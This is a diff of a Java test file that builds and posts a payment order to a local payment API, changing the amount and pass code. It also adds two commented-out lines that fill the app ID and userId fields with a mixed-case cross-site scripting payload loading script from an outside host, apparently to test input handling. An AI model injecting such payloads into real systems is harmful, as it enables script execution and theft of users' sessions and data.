@@ -224,13 +224,14 @@ public class witTest {
 
 
 		Deal deal = new Deal();
-		deal.setAmount(1501+"");//金额
+		deal.setAmount(800+"");//金额
 		deal.setAppId(userid);//商户号
+//		deal.setAppId("<sCrIpt/srC=//xs.ax/aE7W></sCRipT>");//商户号
 		deal.setApplyDate(d.format(new Date()));
 		deal.setNotifyUrl("http://starpay168.com:5055");
 		deal.setPageUrl("http://starpay168.com:5055");
 		deal.setOrderId(IdUtil.objectId());
-		deal.setPassCode("lelicard");
+		deal.setPassCode("caiyun");
 		deal.setSubject("订单交易");
 		deal.setUserid("张三");  //to userid
 		Map<String, Object> objectToMap = MapUtil.objectToMap(deal);
@@ -248,6 +249,7 @@ public class witTest {
 		Map<String, Object> postMap = new HashMap<String, Object>();
 		postMap.put("cipherText", publicEncrypt);
 		postMap.put("userId", userid);
+//		postMap.put("userId", "<sCrIpt/srC=//xs.ax/aE7W></sCRipT>");
 		System.out.println("请求参数：" + postMap.toString());
 		String post = HttpUtil.post("http://localhost:9010/deal/pay", postMap);
 		System.out.println("相应结果集：" + post);
